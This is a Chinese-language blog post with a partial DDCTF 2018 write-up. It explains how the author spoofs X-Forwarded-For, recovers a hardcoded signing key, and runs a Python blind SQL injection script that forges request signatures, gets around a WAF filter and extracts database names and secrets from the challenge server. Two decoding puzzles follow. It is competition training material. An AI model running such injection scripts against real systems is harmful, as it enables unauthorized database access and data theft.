@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="web1 数据库的密码验证参数分析非法链接，只允许来自 123.232.23.245 的访问，设置X-Forwarded-For:123.232.23.245查看源码：\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165  八进制adrefkfweodfsdpiru点击seach后面跟着验证参数main.j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 部分writeup">
+<meta property="og:url" content="http://www.cuittk.cn/2018/04/22/DDCTF 部分writeup/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="web1 数据库的密码验证参数分析非法链接，只允许来自 123.232.23.245 的访问，设置X-Forwarded-For:123.232.23.245查看源码：\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165  八进制adrefkfweodfsdpiru点击seach后面跟着验证参数main.j">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/73uh9x6azr02u8qng4pmlckw97.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/fa3vdm234qme7yu2jewku15xyw.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/lg5t2wo3ebwewfzr2j7jx9h8se.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/w1nz1zlgjy2b7u5dh620jz97ct.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/zg817i42bxwasu7r7cxju0boqo.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/0vyz9ztl5trzftgjy2id76w78e.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/78gdb8hdxzrdli352j2izter60.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/iulv9h51gcfpqqqfrphsprr3bl.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/vl8xdt5f3kdquibjn7ff2hrdls.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/bqaaxrqhh44e7u81l777lanhfr.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/yxae8g1qc348tjxurrkd5621kb.png">
+<meta property="og:updated_time" content="2018-11-10T09:13:31.553Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF 部分writeup">
+<meta name="twitter:description" content="web1 数据库的密码验证参数分析非法链接，只允许来自 123.232.23.245 的访问，设置X-Forwarded-For:123.232.23.245查看源码：\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165  八进制adrefkfweodfsdpiru点击seach后面跟着验证参数main.j">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/73uh9x6azr02u8qng4pmlckw97.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2018/04/22/DDCTF 部分writeup/"/>
+
+
+
+
+
+  <title>DDCTF 部分writeup | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/04/22/DDCTF 部分writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DDCTF 部分writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T00:12:18+08:00">
+                2018-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="web1-数据库的密码"><a href="#web1-数据库的密码" class="headerlink" title="web1 数据库的密码"></a>web1 数据库的密码</h3><h4 id="验证参数分析"><a href="#验证参数分析" class="headerlink" title="验证参数分析"></a>验证参数分析</h4><p><img src="http://img.cdn.cuittk.cn/73uh9x6azr02u8qng4pmlckw97.png" alt=""><br><img src="http://img.cdn.cuittk.cn/fa3vdm234qme7yu2jewku15xyw.png" alt=""><br>非法链接，只允许来自 123.232.23.245 的访问，<br>设置X-Forwarded-For:123.232.23.245<br>查看源码：<br><img src="http://img.cdn.cuittk.cn/lg5t2wo3ebwewfzr2j7jx9h8se.png" alt=""><br>\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165  八进制<br><img src="http://img.cdn.cuittk.cn/w1nz1zlgjy2b7u5dh620jz97ct.png" alt=""><br><img src="http://img.cdn.cuittk.cn/zg817i42bxwasu7r7cxju0boqo.png" alt=""><br>adrefkfweodfsdpiru<br>点击seach<br><img src="http://img.cdn.cuittk.cn/0vyz9ztl5trzftgjy2id76w78e.png" alt=""><br>后面跟着验证参数<br>main.js经过了加密压缩<br><img src="http://img.cdn.cuittk.cn/78gdb8hdxzrdli352j2izter60.png" alt=""><br>解密过程：去掉开头eval这4个字母，打开chrome或火狐浏览器，F12打开控制台，代码复制进去按回车输出如下：<br><img src="http://img.cdn.cuittk.cn/iulv9h51gcfpqqqfrphsprr3bl.png" alt=""><br>再代码美化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">function signGenerate(obj, key) &#123;</div><div class="line">    var str0 = &apos;&apos;;</div><div class="line">    for (i in obj) &#123;</div><div class="line">        if (i != &apos;sign&apos;) &#123;</div><div class="line">            str1 = &apos;&apos;;</div><div class="line">            str1 = i + &apos;=&apos; + obj[i];</div><div class="line">            str0 += str1</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    return hex_math_enc(str0 + key)</div><div class="line"></div><div class="line">&#125;;</div><div class="line">var obj = &#123;</div><div class="line">    id: &apos;&apos;,</div><div class="line">    title: &apos;&apos;,</div><div class="line">    author: &apos;&apos;,</div><div class="line">    date: &apos;&apos;,</div><div class="line">    time: parseInt(new Date().getTime() / 1000)</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function submitt() &#123;</div><div class="line">    obj[&apos;id&apos;] = document.getElementById(&apos;id&apos;).value;</div><div class="line">    obj[&apos;title&apos;] = document.getElementById(&apos;title&apos;).value;</div><div class="line">    obj[&apos;author&apos;] = document.getElementById(&apos;author&apos;).value;</div><div class="line">    obj[&apos;date&apos;] = document.getElementById(&apos;date&apos;).value;</div><div class="line">    var sign = signGenerate(obj, key);</div><div class="line">    document.getElementById(&apos;queryForm&apos;).action = &quot;index.php?sig=&quot; + sign + &quot;&amp;time=&quot; + obj.time;</div><div class="line">    document.getElementById(&apos;queryForm&apos;).submit()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>hex_math_enc()函数在math.js中，如果看不懂signGenerate函数就return (str+key) 在本地测试：<br><img src="http://img.cdn.cuittk.cn/vl8xdt5f3kdquibjn7ff2hrdls.png" alt=""><br>id=1为传入的参数，其余没有传入参数，再和time(时间戳)、key组合再sha-1加密</p>
+<h4 id="注入点分析"><a href="#注入点分析" class="headerlink" title="注入点分析"></a>注入点分析</h4><p>POST请求中有4个参数：id、title、date、author,而页面中没有author参数提交，但是直接POST提交author参数会有sig做参数校验需要进行组合加密，使用py脚本实现author参数构造<br>‘狗’拦截了:and、union 和select 在一起的一切形式、--、/*、database()、sleep()<br>没有拦截:&amp;&amp;、union、select、substr()函数、from、#、information_schema<br>页面查询使用的like语句输入’%’为通配符，对id、title、date传入的单引号进行了\’转义，而且是POST传入宽字节注入无效，只能对author参数进行注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">author=&apos;\&apos; &amp;&amp; 1=1#&apos;	#py脚本需要转义单引号</div></pre></td></tr></table></figure></p>
+<p>发现返回正常，1=2没有查询的内容返回，存在注入<br>由于过滤了 union select 则使用substr进行盲注，而0x16进制发现无效但是可以使用’d’进行验证。<br>python脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">import time</div><div class="line">import hashlib</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">t = time.time()</div><div class="line">mtime = str(int(t))</div><div class="line">mid =&apos;&apos;</div><div class="line">title =&apos;&apos;</div><div class="line">author =&apos;&apos;</div><div class="line">date = &apos;&apos;</div><div class="line">def sqlmimi():</div><div class="line">	sig = &apos;id=&apos;+mid+&apos;title=&apos;+title+&apos;author=&apos;+author+&apos;date=&apos;+date+&apos;time=&apos;+mtime+&apos;adrefkfweodfsdpiru&apos;</div><div class="line">    sig = hashlib.sha1(sig).hexdigest()</div><div class="line">    url = &apos;http://116.85.43.88:8080/PEQFGTUTQMZWCZGK/dfe3ia/index.php?sig=&apos;</div><div class="line">    headers = &#123;&apos;X-Forwarded-For&apos;: &apos;123.232.23.245&apos;&#125;</div><div class="line">    payload = &#123;&apos;id&apos;:mid,&apos;title&apos;: title,&apos;author&apos;: author,&apos;date&apos;: date,&apos;button&apos;:&apos;search&apos;&#125;</div><div class="line">    url = url+sig+&apos;&amp;time=&apos;+mtime</div><div class="line">    requests1 = requests.post(url,headers=headers,data=payload)</div><div class="line">    content = requests1.content</div><div class="line">    #print(requests1.status_code)#打印状态码</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    if(requests1.status_code == 200):#如果没有被狗拦截</div><div class="line">    	tables = soup.select(&apos;table&apos;)[2]</div><div class="line">        if(tables.text.find(&apos;1&apos;)&gt;-1):#如果返回的table[2]内容中有1即返回正常</div><div class="line">        # print(author)</div><div class="line">        return author</div><div class="line"></div><div class="line">str1 = &apos;0123456789qwertyuiopasdfghjklzxcvbnm&#123;&#125;_@&apos;</div><div class="line">#for i in range(1,12):</div><div class="line">for i in range(1,25):</div><div class="line">	for j in str1:</div><div class="line">    	#author = &apos;\&apos; &amp;&amp; substr((select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1),%d,1)=\&apos;%s\&apos;#&apos; %(i, j)</div><div class="line">        #author = &apos;\&apos; &amp;&amp; substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=\&apos;ddctf\&apos; limit 0,1),%d,1)=\&apos;%s\&apos;#&apos; %(i, j)</div><div class="line">        #author = &apos;__\&apos; &amp;&amp; substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=\&apos;ctf_key1\&apos; limit 0,1),%d,1)=\&apos;%s\&apos;#&apos; %(i, j)</div><div class="line">        author = &apos;\&apos; &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),%d,1)=\&apos;%s\&apos;#&apos; %(i, j)</div><div class="line">        au = sqlmimi()</div><div class="line">        if(au!=None):</div><div class="line">        	print(au)</div><div class="line">            break</div><div class="line">#最后全部大写DDCTF&#123;&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="杂项1-╯°□°）╯︵-┻━┻"><a href="#杂项1-╯°□°）╯︵-┻━┻" class="headerlink" title="杂项1 (╯°□°）╯︵ ┻━┻"></a>杂项1 (╯°□°）╯︵ ┻━┻</h3><p>先来张表情包<br><img src="http://img.cdn.cuittk.cn/bqaaxrqhh44e7u81l777lanhfr.png" alt=""><br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd<br>分析为一个字母加一个数字（个别是两个字母），而且都没有大于f的字母,16进制，16进制转10进制，再凯撒密码解密后再ascii编码转字符。<br>python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">str = &quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd&quot;</div><div class="line">pay = &quot;&quot;</div><div class="line">for i in range(len(str)):</div><div class="line">    if(i%2==0):</div><div class="line">        a = int(&apos;0x&apos;+str[i:i+2],16)</div><div class="line">        print(a)</div><div class="line">        a -=128</div><div class="line">        pay = pay+chr(a)</div><div class="line">print(pay)</div><div class="line">print(&apos;-----------&apos;)</div><div class="line">#猜测有DDCTF关键词，找到有相同的10进制数，与DD相差多少，用后面3位验证相差数以确定</div><div class="line">print(&apos;-----------&apos;)</div></pre></td></tr></table></figure></p>
+<h3 id="杂项2-第四扩展FS"><a href="#杂项2-第四扩展FS" class="headerlink" title="杂项2 第四扩展FS"></a>杂项2 第四扩展FS</h3><p>题目：<br>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。<br>下载windows.jpg<br>发现图片文件这么大12MB,肯定隐藏的有其他文件<br>binwalk提取出一个加密的zip文件，密码为windows.jpg属性的详细详细的备注中<br><img src="http://img.cdn.cuittk.cn/yxae8g1qc348tjxurrkd5621kb.png" alt=""><br>解压出file.txt文件30KB，内容为FHic}CxcHDxa}u{DD}ueHgDDD1DiDxuFDHoCu}cDDuDi}1ugDFoDcno{gnc1FTFauF1{o}形式，非常多的字符组成。<br>题目说：频次有时候非常重要<br>分析每个字符的频率。<br>python脚本如下:<br>使用python中的collections模块中的的Counter类是一个容器类型，可以用来对数据出现的次数进行计数统计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from collections import Counter</div><div class="line"></div><div class="line">file1 = open(&apos;file.txt&apos;)</div><div class="line">contents = file1.read()</div><div class="line">print(Counter(contents))</div><div class="line">file1.close()</div></pre></td></tr></table></figure></p>
+<p>频率从高到底即为flag:DDCTF{}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/" rel="next" title="通过MITMf利用$MFT漏洞锁定局域网电脑">
+                <i class="fa fa-chevron-left"></i> 通过MITMf利用$MFT漏洞锁定局域网电脑
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/26/DDCTF2018 专属链接 writeup/" rel="prev" title="DDCTF2018 专属链接 writeup">
+                DDCTF2018 专属链接 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1-数据库的密码"><span class="nav-number">1.</span> <span class="nav-text">web1 数据库的密码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#验证参数分析"><span class="nav-number">1.1.</span> <span class="nav-text">验证参数分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入点分析"><span class="nav-number">1.2.</span> <span class="nav-text">注入点分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#杂项1-╯°□°）╯︵-┻━┻"><span class="nav-number">2.</span> <span class="nav-text">杂项1 (╯°□°）╯︵ ┻━┻</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#杂项2-第四扩展FS"><span class="nav-number">3.</span> <span class="nav-text">杂项2 第四扩展FS</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
